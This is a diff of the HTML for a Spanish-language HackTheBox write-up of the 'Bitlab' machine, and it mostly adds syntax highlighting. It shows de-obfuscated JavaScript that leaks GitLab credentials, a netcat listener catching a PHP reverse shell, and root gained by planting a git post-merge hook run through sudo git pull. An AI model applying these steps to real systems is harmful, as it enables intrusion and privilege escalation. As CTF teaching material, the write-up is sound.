@@ -107,7 +107,7 @@ A pesar de todo, en el futuro actualizaré este post para reflejar el camino ví
 <p>Dicho eso, hora de ensuciarse las manos :D</p>
 <h2 id=nmap>Nmap</h2>
 <p>Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
 Nmap scan report for bitlab.htb (10.10.10.114)
 Host is up (0.019s latency).
@@ -130,10 +130,10 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
 No exact OS matches for host (test conditions non-ideal).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
-</code></pre><p>Obtenemos que SSH (22) y HTTP (80) están abiertos más que el servidor web ejecutándose en el puerto 80 es <a href=https://gitlab.com/>Gitlab</a>.</p>
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap <span style=color:#66d9ef>done</span> at Thu Dec <span style=color:#ae81ff>12</span> 22:34:15 <span style=color:#ae81ff>2019</span> -- <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 17.39 seconds
+</code></pre></div><p>Obtenemos que SSH (22) y HTTP (80) están abiertos más que el servidor web ejecutándose en el puerto 80 es <a href=https://gitlab.com/>Gitlab</a>.</p>
 <h2 id=enumeración-web>Enumeración Web</h2>
 <p>La página de inicio (<code>http://10.10.10.114/</code>), solamente es la página de login standard de gitlab:</p>
 <img src=https://ceso.github.io/images/htb/bitlab/1.1-web_enum.png class=center style=border-radius:8px>
@@ -142,12 +142,12 @@ OS and Service detection performed. Please report any incorrect results at https
 <img src=https://ceso.github.io/images/htb/bitlab/1.3-web_enum.png class=center style=border-radius:8px>
 <p>Vemos que <code>Gitlab Login</code> es código javascript ofuscado, pasamos a hacer desofusación (yo usé <a href=https://lelinhtinh.github.io/de4js/>de4js</a> pero cualquier herramienta de desofuscación o incluso la consola de python sirve):</p>
 <p>Del código:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span>(<span style=color:#66d9ef>function</span>(){ <span style=color:#66d9ef>var</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style=color:#e6db74>&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style=color:#e6db74>&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style=color:#e6db74>&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>3</span>];document[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>5</span>]; })()
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span>(<span style=color:#66d9ef>function</span>(){ <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span><span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;\x76\x61\x6C\x75\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&#34;</span>,<span style=color:#e6db74>&#34;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&#34;</span>,<span style=color:#e6db74>&#34;\x63\x6C\x61\x76\x65&#34;</span>,<span style=color:#e6db74>&#34;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&#34;</span>,<span style=color:#e6db74>&#34;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&#34;</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]]<span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>]; })()
 </code></pre></div><p>Obtenemos el siguiente:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a6e22e>javascript</span><span style=color:#f92672>:</span> (<span style=color:#66d9ef>function</span> () {
-    <span style=color:#66d9ef>var</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;user_login&#34;</span>, <span style=color:#e6db74>&#34;getElementById&#34;</span>, <span style=color:#e6db74>&#34;clave&#34;</span>, <span style=color:#e6db74>&#34;user_password&#34;</span>, <span style=color:#e6db74>&#34;11des0081x&#34;</span>];
-    document[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>3</span>];
-    document[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#ae81ff>_0</span><span style=color:#a6e22e>x4b18</span>[<span style=color:#ae81ff>5</span>];
+    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>_0x4b18</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;user_login&#34;</span>, <span style=color:#e6db74>&#34;getElementById&#34;</span>, <span style=color:#e6db74>&#34;clave&#34;</span>, <span style=color:#e6db74>&#34;user_password&#34;</span>, <span style=color:#e6db74>&#34;11des0081x&#34;</span>];
+    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>1</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>3</span>];
+    document[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>2</span>]](<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>4</span>])[<span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>0</span>]] <span style=color:#f92672>=</span> <span style=color:#a6e22e>_0x4b18</span>[<span style=color:#ae81ff>5</span>];
 })()
 </code></pre></div><p>Con esas credenciales nos podemos intentamos loguearnos, un usuario llamado <code>clave</code> y con contraseñá <code>11des0081x</code>, nos logueamos exitosamente y tenemos acceso a algunos proyectos:</p>
 <img src=https://ceso.github.io/images/htb/bitlab/1.5-web_enum.png class=center style=border-radius:8px>
@@ -178,26 +178,26 @@ $branch <span style=color:#f92672>=</span> $payload<span style=color:#f92672>-&g
 <img src=https://ceso.github.io/images/htb/bitlab/1.rce.png class=center style=border-radius:8px>
 <p>Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar.
 Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
 Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
  19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 www-data@bitlab:/var/www$ pwd
 pwd
 /var/www
-</code></pre><p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/var/www$ sudo -l
+</code></pre></div><p>Verificamos si tenemos permisos de sudo, y vemos lo siguiente:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@bitlab:/var/www$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on bitlab:
     env_reset, exempt_group=sudo, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on bitlab:
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>User www-data may run the following commands on bitlab:
     (root) NOPASSWD: /usr/bin/git pull
 www-data@bitlab:/var/www$ getent passwd www-data
 getent passwd www-data
@@ -215,9 +215,9 @@ drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
 -rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
 -rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
 -rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
-</code></pre><p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para <a href=https://git-scm.com/docs/githooks#_post_merge>hooks: post merge</a> y la de <a href=https://git-scm.com/docs/git-pull>git pull</a>.</p>
+</code></pre></div><p>Hasta ahora, sabemos que los repositorios de git están en <code>/var/www/html</code> y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (<code>git pull</code> es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para <a href=https://git-scm.com/docs/githooks#_post_merge>hooks: post merge</a> y la de <a href=https://git-scm.com/docs/git-pull>git pull</a>.</p>
 <p>Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
 cp -r profile /tmp/profile
 www-data@bitlab:/tmp/profile$ ls -la
 ls -la
@@ -232,15 +232,15 @@ drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
 -rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
 drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
 -rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
-</code></pre><p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ cd .git/hooks
+</code></pre></div><p>Creamos un script que se llama <code>post-merge</code> adentro de <code>.git/hooks</code> para conseguir un shell como root y le damos permisos de ejcución:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ cd .git/hooks
 cd .git/hooks
-www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
-&lt; 'exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2' &gt; post-merge
+www-data@bitlab:/tmp/profile/.git/hooks$ echo &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
+&lt; &#39;exec /bin/bash 0&lt;&amp;2 1&gt;&amp;2&#39; &gt; post-merge
 www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
 chmod u+x post-merge
-</code></pre><p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ sudo git pull
+</code></pre></div><p>Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos <code>sudo git pull</code> y con eso ahora somos root:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@bitlab:/tmp/profile$ sudo git pull
 sudo git pull
 remote: Enumerating objects: 4, done.
 remote: Counting objects: 100% (4/4), done.
@@ -266,7 +266,7 @@ root.txt
 root@bitlab:~# wc -c root.txt
 wc -c root.txt
 33 root.txt
-</code></pre><p>Con esto ya podemos irnos a ````/home``` y ver ahí la flag de user y de root.</p>
+</code></pre></div><p>Con esto ya podemos irnos a ````/home``` y ver ahí la flag de user y de root.</p>
 <h2 id=más-allá-de-root>Más allá de root</h2>
 <p>Como dije en el principio del post, hay dos caminos para esta máquina:
 Ok, as I said at the begining of the post, there are 2 paths to get this box:</p>
@@ -289,8 +289,8 @@ Ok, as I said at the begining of the post, there are 2 paths to get this box:</p
 </code></pre></div><p>Y despué de guardarlos y hacerle merge, nos vamos a <code>http://10.10.10.114/profile/&lt;el nombre que le diste al script></code>, y deberíamos tener como resultado el array en pantalla con el usuario <code>clave</code> y una contraseñá:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>Array ( [<span style=color:#ae81ff>0</span>] =&gt; Array ( [<span style=color:#a6e22e>id</span>] =&gt; <span style=color:#ae81ff>1</span> [<span style=color:#a6e22e>username</span>] =&gt; <span style=color:#a6e22e>clave</span> [<span style=color:#a6e22e>password</span>] =&gt; <span style=color:#a6e22e>c3NoLXN0cjBuZy1wQHNz</span><span style=color:#f92672>==</span> ) )
 </code></pre></div><p>Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
-clave@10.10.10.114's password: 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
+clave@10.10.10.114&#39;s password: 
 Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
 clave@bitlab:~$ id
 uid=1000(clave) gid=1000(clave) groups=1000(clave)
@@ -307,7 +307,7 @@ drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
 -r-------- 1 clave clave    33 Feb 28  2019 user.txt
 clave@bitlab:~$ wc -c user.txt 
 33 user.txt
-</code></pre><p>Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama <code>RemoteConnection.exe</code>, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.</p>
+</code></pre></div><p>Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama <code>RemoteConnection.exe</code>, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.</p>
 <p>Bueno, entonces sabemos que esta máquina tiene dos formas de conseguir root. Me encantó esta máquina, y estoy esperando a tirarme al agua con ella de nuevo cuando tenga un poquito más de idea de ing. inversa.</p>
 <p>Ta luego, hasta el próximo paso a paso!</p>
 </div>
